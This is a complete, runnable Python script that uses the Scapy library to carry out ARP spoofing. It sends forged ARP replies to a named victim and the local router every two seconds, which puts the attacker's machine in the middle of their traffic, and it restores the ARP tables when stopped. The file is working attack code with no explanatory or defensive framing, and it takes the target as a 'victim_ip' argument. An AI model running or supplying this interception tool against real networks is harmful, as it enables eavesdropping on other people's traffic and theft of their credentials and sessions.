from scapy.all import *
import sys

# Function to send spoofed ARP reply
def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="is-at", hwsrc=get_if_hwaddr(conf.iface), psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

# Function to restore the original ARP table entries
def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, count=5, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 arp_spoof.py <victim_ip> <router_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    # Get MAC addresses of victim and router
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    if victim_mac is None or router_mac is None:
        print("Failed to get MAC addresses. Ensure the IPs are reachable.")
        sys.exit(1)

    try:
        print("Sending spoofed ARP packets. Press Ctrl+C to stop.")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)  # Spoof victim
            arp_spoof(router_ip, router_mac, victim_ip)  # Spoof router
            time.sleep(2)  # Sleep to reduce network flooding
    except KeyboardInterrupt:
        print("\nRestoring ARP Tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print("ARP Tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()

